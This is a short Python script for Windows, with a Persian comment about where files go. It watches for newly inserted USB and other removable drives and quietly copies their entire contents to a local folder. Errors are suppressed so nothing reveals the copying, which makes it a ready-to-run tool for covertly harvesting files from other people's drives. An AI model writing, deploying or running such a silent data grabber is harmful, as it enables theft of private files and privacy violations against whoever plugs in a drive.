import os
import shutil
import win32file
import time

DESTINATION_PATH = r"C:\Users\admin\OneDrive\Desktop" # این مسیر نمونست. مسیر مورد نظر خودتو برای ذخیزه فایل ها در این خط قرار بده
POLL_INTERVAL = 5  # Check every 5 seconds

def get_removable_drives():
    drives = set()
    all_drives = win32file.GetLogicalDrives()
    for drive_letter in range(26):
        if all_drives & (1 << drive_letter):
            drive_name = f"{chr(65 + drive_letter)}:\\"
            if win32file.GetDriveType(drive_name) == win32file.DRIVE_REMOVABLE:
                drives.add(drive_name)
    return drives

def copy_contents(source, destination):
    try:
        for root, dirs, files in os.walk(source):
            for file in files:
                src_path = os.path.join(root, file)
                dest_path = os.path.join(destination, os.path.relpath(src_path, source))
                os.makedirs(os.path.dirname(dest_path), exist_ok=True)
                shutil.copy2(src_path, dest_path)
    except Exception as e:
        pass  # Fail silently

def monitor():
    known_drives = set()
    while True:
        current_drives = get_removable_drives()
        new_drives = current_drives - known_drives
        for drive in new_drives:
            time.sleep(2)  # Wait for drive readiness
            copy_contents(drive, DESTINATION_PATH)
        known_drives = current_drives
        time.sleep(POLL_INTERVAL)

if __name__ == "__main__":
    monitor()

